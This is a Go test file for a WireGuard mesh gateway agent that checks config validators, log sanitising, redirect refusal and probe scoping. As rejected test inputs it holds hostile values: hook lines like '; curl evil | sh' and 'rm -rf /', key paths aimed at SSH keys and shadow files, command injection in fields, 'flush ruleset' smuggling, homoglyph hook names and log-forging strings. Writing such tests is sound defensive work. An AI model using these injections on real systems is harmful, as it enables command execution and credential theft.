package main

import (
	"bytes"
	"errors"
	"fmt"
	"log"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

const testKey = "rjqlrC7N/QsK15DjL/JKh/5ezM35+ZP6mJH/jqO7bl4="

// goldenFiles returns every generated gateway file of one kind. The golden
// tests run from the repository checkout (CI, scripts/agent-test.mjs).
func goldenFiles(t *testing.T, kind string) map[string]string {
	t.Helper()
	paths, err := filepath.Glob(filepath.Join("..", "test", "golden", "*", "*."+kind))
	if err != nil || len(paths) == 0 {
		t.Fatalf("no golden *.%s files under ../test/golden (%v); run the tests from the repository checkout", kind, err)
	}
	out := map[string]string{}
	for _, p := range paths {
		data, err := os.ReadFile(p)
		if err != nil {
			t.Fatal(err)
		}
		out[p] = string(data)
	}
	return out
}

func TestGoldenFilesValidate(t *testing.T) {
	for p, conf := range goldenFiles(t, "wireguard.conf") {
		if err := validateWireGuard(conf, "/etc/opnmesh"); err != nil {
			t.Errorf("%s: %v", p, err)
		}
		if privateKeyPathOf(conf) != "/etc/opnmesh/private.key" {
			t.Errorf("%s: private key path not found", p)
		}
	}
	for p, conf := range goldenFiles(t, "sysctl.conf") {
		got, err := parseSysctl(conf)
		if err != nil || len(got) != 1 || got[0] != (sysctlSetting{"net.ipv4.ip_forward", "1"}) {
			t.Errorf("%s: %v %v", p, got, err)
		}
	}
	for p, conf := range goldenFiles(t, "nftables.conf") {
		if err := validateNftables(conf); err != nil {
			t.Errorf("%s: %v", p, err)
		}
	}
}

func TestValidateWireGuardRefuses(t *testing.T) {
	hook := "PostUp = wg set %i private-key /etc/opnmesh/private.key"
	cases := map[string]string{
		// wg-quick's read drops NUL, so this is a PostUp hook to bash.
		"NUL in a key":              "[Interface]\nPost\x00Up = touch /tmp/pwned\n",
		"NUL in a value":            "[Interface]\n" + hook + "\x00; touch /tmp/pwned\n",
		"NUL in a comment":          "[Interface]\n# \x00\n",
		"NUL after an inline #":     "[Interface]\n" + hook + " #\x00\n",
		"CR line ends":              "[Interface]\r\nAddress = 10.99.0.1/24\r\n",
		"ESC in a comment":          "[Interface]\n# \x1b[1A\x1b[2K\nAddress = 10.99.0.1/24\n",
		"DEL":                       "[Interface]\nAddress = 10.99.0.1/24\x7f\n",
		"vertical tab":              "[Interface]\nAddress = 10.99.0.1/24\v\n",
		"invalid UTF-8":             "# \xff\xfe\n[Interface]\n",
		"bidi override in comment":  "# \u202e\n[Interface]\n",
		"zero-width space in key":   "[Interface]\nPreUp\u200b = touch /tmp/pwned\n",
		"Cyrillic o in PostUp":      "[Interface]\nP\u043estUp = touch /tmp/pwned\n",
		"fullwidth PreUp":           "[Interface]\n\uff30\uff52\uff45\uff35\uff50 = touch /tmp/pwned\n",
		"no-break space before =":   "[Interface]\nPreUp\u00a0= touch /tmp/pwned\n",
		"Cyrillic I in section":     "[\u0406nterface]\nPreUp = touch /tmp/pwned\n",
		"Kelvin sign in value":      "[Peer]\nEndpoint = \u212a.example.com:51820\n",
		"PreUp":                     "[Interface]\nPreUp = /bin/true\n",
		"lower-case preup":          "[Interface]\npreup = /bin/true\n",
		"upper-case PREDOWN":        "[Interface]\nPREDOWN = /bin/true\n",
		"PostDown":                  "[Interface]\nPostDown = rm -rf /\n",
		"SaveConfig":                "[Interface]\nSaveConfig = true\n",
		"Table":                     "[Interface]\nTable = off\n",
		"FwMark":                    "[Interface]\nFwMark = 0x1\n",
		"DNS":                       "[Interface]\nDNS = 1.1.1.1\n",
		"PrivateKey":                "[Interface]\nPrivateKey = " + testKey + "\n",
		"unknown key":               "[Interface]\nFoo = bar\n",
		"spaced key":                "[Interface]\nPost Up = touch /tmp/pwned\n",
		"PostUp in [Peer]":          "[Peer]\n" + hook + "\n",
		"PublicKey in [Interface]":  "[Interface]\nPublicKey = " + testKey + "\n",
		"Address in [Peer]":         "[Peer]\nAddress = 10.99.0.1/24\n",
		"Endpoint in [Interface]":   "[Interface]\nEndpoint = 203.0.113.5:51820\n",
		"key before any section":    "Address = 10.99.0.1/24\n[Interface]\n",
		"hook before any section":   hook + "\n[Interface]\n",
		"bare hook name":            "[Interface]\nPostUp\n",
		"stray text":                "[Interface]\nwhatever\n",
		"unknown section":           "[Interface2]\n",
		"section with a value":      "[Interface] = x\n",
		"unclosed section":          "[Peer\n",
		"hook hidden by a comment":  "[Interface]\nPostUp = touch /tmp/pwned # wg set %i private-key /etc/opnmesh/private.key\n",
		"hook with a second cmd":    "[Interface]\n" + hook + "; curl evil | sh\n",
		"key outside conf dir":      "[Interface]\nPostUp = wg set %i private-key /root/.ssh/id_rsa\n",
		"key path escaping":         "[Interface]\nPostUp = wg set %i private-key /etc/opnmesh/../shadow\n",
		"relative key path":         "[Interface]\nPostUp = wg set %i private-key private.key\n",
		"address with a command":    "[Interface]\nAddress = 10.99.0.1/24; reboot\n",
		"address glob":              "[Interface]\nAddress = /etc/*\n",
		"port with a suffix":        "[Interface]\nListenPort = 51820 x\n",
		"port zero":                 "[Interface]\nListenPort = 0\n",
		"negative port":             "[Interface]\nListenPort = -1\n",
		"service name as port":      "[Interface]\nListenPort = http\n",
		"arithmetic MTU":            "[Interface]\nMTU = a[$(reboot)]\n",
		"bad public key":            "[Peer]\nPublicKey = not-a-key\n",
		"short public key":          "[Peer]\nPublicKey = AAAA\n",
		"bad allowed ip":            "[Peer]\nAllowedIPs = 10.0.0.0/8, evil\n",
		"empty allowed ip":          "[Peer]\nAllowedIPs = 10.0.0.0/8,\n",
		"endpoint without port":     "[Peer]\nEndpoint = 203.0.113.5\n",
		"endpoint with a command":   "[Peer]\nEndpoint = a;reboot:51820\n",
		"endpoint port too big":     "[Peer]\nEndpoint = example.com:99999\n",
		"endpoint with zone":        "[Peer]\nEndpoint = [fe80::1%eth0]:51820\n",
		"bad keepalive":             "[Peer]\nPersistentKeepalive = soon\n",
		"allowed ip with interface": "[Peer]\nAllowedIPs = 10.0.0.0/8 dev eth0\n",
	}
	for name, conf := range cases {
		if err := validateWireGuard(conf, "/etc/opnmesh"); err == nil {
			t.Errorf("%s: accepted %q", name, conf)
		}
	}
}

func TestValidateWireGuardAccepts(t *testing.T) {
	// Spellings wg-quick reads the same way as the generator's output.
	conf := "# Generated — naïve comments are fine ✓\n" +
		"\n" +
		"[interface]\n" +
		"  address\t=\t10.99.0.1/24, fd00::1/64\n" +
		"LISTENPORT = 51820 # the port routers forward\n" +
		"mtu = 1420\n" +
		"postup = wg set %i private-key /etc/opnmesh/keys/private.key\n" +
		"\n" +
		"[PEER]\n" +
		"PublicKey = " + testKey + "\n" +
		"PresharedKey = " + testKey + "\n" +
		"Endpoint = [2001:db8::1]:51820\n" +
		"AllowedIPs = 10.99.0.2, 192.168.20.0/24\n" +
		"PersistentKeepalive = off\n" +
		"[Peer]\n" +
		"PublicKey = " + testKey + "\n" +
		"Endpoint = Office-1.dyndns.example:443\n" +
		"AllowedIPs = 10.99.0.3/32\n" +
		"PersistentKeepalive = 25\n"
	if err := validateWireGuard(conf, "/etc/opnmesh/"); err != nil {
		t.Fatal(err)
	}
	if p := privateKeyPathOf(conf); p != "/etc/opnmesh/keys/private.key" {
		t.Fatalf("key path: %q", p)
	}
	if err := validateWireGuard("", "/etc/opnmesh"); err != nil {
		t.Fatalf("an empty file has nothing to refuse: %v", err)
	}
}

func TestParseSysctl(t *testing.T) {
	got, err := parseSysctl("# c — fine\n\n  net.ipv4.ip_forward=0\t\n")
	if err != nil || len(got) != 1 || got[0].Value != "0" {
		t.Fatalf("got %v %v", got, err)
	}
	for _, bad := range []string{
		"net.ipv4.conf.all.rp_filter = 0\n",
		"kernel.core_pattern = |/tmp/x\n",
		"net.core.bpf_jit_enable = 1\n",
		"net/ipv4/ip_forward = 1\n",
		"net.ipv4.ip_forward = 2\n",
		"net.ipv4.ip_forward = 1 # on\n",
		"net.ipv4.ip_forward = 1\x00\n",
		"net.ipv4.ip_forward = 1\r\n",
		"# \x1b]0;x\x07\nnet.ipv4.ip_forward = 1\n",
		"NET.IPV4.IP_FORWARD = 1\n",
		"net.ipv4.ip_forward\n",
		"; comment\n",
		"-net.ipv4.ip_forward = 1\n",
	} {
		if _, err := parseSysctl(bad); err == nil {
			t.Errorf("accepted %q", bad)
		}
	}
}

func TestValidateNftables(t *testing.T) {
	ok := []string{
		"",
		"table inet opnmesh {}\ndelete table inet opnmesh\n\ntable inet opnmesh {\n" +
			"  # a comment with } and { and include\n" +
			"  chain forward {\n" +
			"    type filter hook forward priority filter; policy drop;\n" +
			"    iifname \"br-*\" accept # trailing }\n" +
			"    iifname \"a#b\" comment \"}\" accept\n" +
			"  }\n" +
			"  chain postrouting { type nat hook postrouting priority srcnat; policy accept; masquerade }\n" +
			"}\n",
		"table inet opnmesh { }\n",
	}
	for _, conf := range ok {
		if err := validateNftables(conf); err != nil {
			t.Errorf("refused %q: %v", conf, err)
		}
	}
	body := "table inet opnmesh {\n  chain c {\n  }\n}\n"
	bad := map[string]string{
		"flush ruleset":             "flush ruleset\n",
		"flush after the table":     "table inet opnmesh {}\n" + body + "flush ruleset\n",
		"flush table":               "flush table inet filter\n",
		"flush own table":           "flush table inet opnmesh\n",
		"other table":               "table inet filter {\n}\n",
		"nat table":                 "table ip nat {\n  chain post { type nat hook postrouting priority 100; masquerade }\n}\n",
		"similar name":              "table inet opnmesh2 {\n}\n",
		"other family":              "table ip opnmesh {\n}\n",
		"quoted name":               "table inet \"opnmesh\" {}\n",
		"delete other table":        "delete table inet filter\n",
		"add rule elsewhere":        "add rule inet filter input accept\n",
		"add to own table":          "add rule inet opnmesh forward accept\n",
		"define":                    "define x = 1\n",
		"include":                   "include \"/etc/nftables.conf\"\n",
		"include in the table":      "table inet opnmesh {\n  include \"/tmp/x\"\n}\n",
		"INCLUDE in a chain":        "table inet opnmesh {\n  chain c {\n    INCLUDE \"/tmp/x\"\n  }\n}\n",
		"statement after the close": "table inet opnmesh {\n  chain c { }\n} ; flush ruleset\n",
		"close and reopen":          "table inet opnmesh {\n} table ip nat {\n}\n",
		"all on one line":           "table inet opnmesh { chain c { } } flush ruleset\n",
		"semicolon at top level":    "table inet opnmesh {}; flush ruleset\n",
		"line continuation":         "table inet opnmesh {}\nflush \\\nruleset\n",
		"backslash in a string":     "table inet opnmesh {\n  comment \"x\\\" # \" } ; flush ruleset\n",
		"single quotes":             "table inet opnmesh {\n  '#' }\nflush ruleset\n",
		"string across lines":       "table inet opnmesh {\n  comment \"x\n\" }\n",
		"unbalanced close":          "}\n",
		"never closed":              "table inet opnmesh {\n",
		"JSON":                      "{\"nftables\": []}\n",
		"NUL":                       "table inet opnmesh {}\x00\n",
		"CR":                        "table inet opnmesh {}\r\nflush ruleset\r\n",
		"ESC in a comment":          "# \x1b[1A\n",
		"stray word":                "opnmesh\n",
	}
	for name, conf := range bad {
		if err := validateNftables(conf); err == nil {
			t.Errorf("%s: accepted %q", name, conf)
		}
	}
}

func TestValidateFiles(t *testing.T) {
	if err := validateFiles(map[string]string{"wireguard.conf": sampleConf}, "/etc/opnmesh"); err != nil {
		t.Fatalf("missing optional files: %v", err)
	}
	for _, name := range ManagedFiles {
		files := map[string]string{"wireguard.conf": sampleConf, "sysctl.conf": "net.ipv4.ip_forward = 1\n", "nftables.conf": "table inet opnmesh {}\n"}
		if err := validateFiles(files, "/etc/opnmesh"); err != nil {
			t.Fatal(err)
		}
		files[name] = "flush ruleset\nkernel.x = 1\nPreUp = x\n"
		if err := validateFiles(files, "/etc/opnmesh"); err == nil {
			t.Errorf("a bad %s was accepted", name)
		}
	}
}

func TestPrintable(t *testing.T) {
	in := "a\x1b[31mred\x07\r\nnext\u202eevil\x00\u00a0end\xff"
	if got, want := printable(in), "a[31mred  nextevil end\ufffd"; got != want {
		t.Fatalf("printable(%q) = %q, want %q", in, got, want)
	}
	if got := summariseBody("{\"error\":\"bad\\u001b[2J\\u0007thing\\nFAKE\"}"); got != "bad[2Jthing FAKE" {
		t.Fatalf("summariseBody kept control characters: %q", got)
	}

	var buf bytes.Buffer
	flags, out := log.Flags(), log.Writer()
	log.SetFlags(0)
	log.SetOutput(&buf)
	defer func() { log.SetFlags(flags); log.SetOutput(out) }()
	logf("re-resolve %s: %v", "evil.example:1\n12:00:00 forged line", errors.New("wg: \x1b]0;title\x07failed"))
	if got, want := buf.String(), "re-resolve evil.example:1 12:00:00 forged line: wg: ]0;titlefailed\n"; got != want {
		t.Fatalf("logged %q, want %q", got, want)
	}
}

func TestClientRefusesRedirects(t *testing.T) {
	followed := false
	mux := http.NewServeMux()
	mux.HandleFunc("/api/agent/config", func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, "/elsewhere", http.StatusFound)
	})
	mux.HandleFunc("/elsewhere", func(w http.ResponseWriter, r *http.Request) {
		followed = true
		fmt.Fprint(w, `{"status":"active"}`)
	})
	srv := httptest.NewServer(mux)
	defer srv.Close()

	c, err := newClient(Config{ControllerURL: srv.URL, InsecureHTTP: true}, "gateway-token")
	if err != nil {
		t.Fatal(err)
	}
	_, _, err = c.FetchConfig("")
	if err == nil || !strings.Contains(err.Error(), "redirect (HTTP 302)") || strings.Contains(err.Error(), "\n") {
		t.Fatalf("expected a one-line redirect error, got %v", err)
	}
	if followed {
		t.Fatal("the client followed the redirect and sent the token on")
	}
}

func TestProbeScope(t *testing.T) {
	conf := sampleConf + "\n[Peer]\nPublicKey = " + testKey + "\nEndpoint = 203.0.113.40:51820\nAllowedIPs = 10.99.0.3/32\n"
	s := scopeOf(conf)
	for _, ip := range []string{"10.99.0.2", "10.99.0.77", "192.168.20.1", "10.99.1.10", "203.0.113.40"} {
		if !s.inMesh(ip) {
			t.Errorf("%s should be in the mesh", ip)
		}
	}
	for _, ip := range []string{"192.168.1.1", "8.8.8.8", "10.99.1.12", "", "10.99.0.2 ", "::ffff:10.99.0.2", "10.99.0.2/32"} {
		if s.inMesh(ip) {
			t.Errorf("%q must not be in the mesh", ip)
		}
	}
	for _, ip := range []string{"10.99.1.1", "172.16.5.1", "100.64.0.1", "192.168.1.1"} {
		if !s.routerProbeOK(ip) {
			t.Errorf("router probe to %s should be allowed", ip)
		}
	}
	for _, ip := range []string{"8.8.8.8", "169.254.169.254", "127.0.0.1", "224.0.0.1", "fd00::1"} {
		if s.routerProbeOK(ip) {
			t.Errorf("router probe to %s must be refused", ip)
		}
	}

	req := DiagRequest{
		EndpointHosts: []DiagHost{{Host: "office.example.com"}, {Host: "OFFICE.Example.COM"}, {Host: "exfil.attacker.example"}},
		RemoteNets: []DiagNet{
			{CIDR: "192.168.20.0/24", IP: "192.168.20.1"},
			{CIDR: "10.99.1.0/24", IP: "10.99.1.1"},
			{CIDR: "8.8.8.0/24", IP: "8.8.8.8"},
			{CIDR: "x", IP: "-batch"},
		},
		MTUTargets: []DiagTarget{{IP: "10.99.0.2"}, {IP: "192.168.1.1"}, {IP: "1.1.1.1"}},
	}
	got, refused := s.confine(req)
	if len(got.EndpointHosts) != 2 || len(refused.hosts) != 1 || refused.hosts[0].ID != "dns:exfil.attacker.example" {
		t.Errorf("hosts: %+v %+v", got.EndpointHosts, refused.hosts)
	}
	if len(got.RemoteNets) != 2 || len(refused.nets) != 2 || refused.nets[0].ID != "route:8.8.8.0/24" {
		t.Errorf("nets: %+v %+v", got.RemoteNets, refused.nets)
	}
	if len(got.MTUTargets) != 1 || len(refused.targets) != 2 || refused.targets[1].ID != "mtu:1.1.1.1" {
		t.Errorf("targets: %+v %+v", got.MTUTargets, refused.targets)
	}
	for _, c := range append(append(refused.hosts, refused.nets...), refused.targets...) {
		if c.Status != "warn" || c.Detail == "" || c.Hint == "" {
			t.Errorf("refusal must explain itself: %+v", c)
		}
	}

	// A request over the cap is cut at the cap, and says so once.
	var many []DiagTarget
	for i := 0; i < 200; i++ {
		many = append(many, DiagTarget{IP: "10.99.0.2"})
	}
	got, refused = s.confine(DiagRequest{MTUTargets: many})
	if len(got.MTUTargets) != maxDiagTargets || len(refused.targets) != 1 || refused.targets[0].ID != "limit:mtu" {
		t.Errorf("cap: kept %d, refused %+v", len(got.MTUTargets), refused.targets)
	}

	// Without a WireGuard file nothing is in the mesh.
	if (probeScope{}).inMesh("10.99.0.2") {
		t.Error("an empty scope must hold nothing")
	}
}
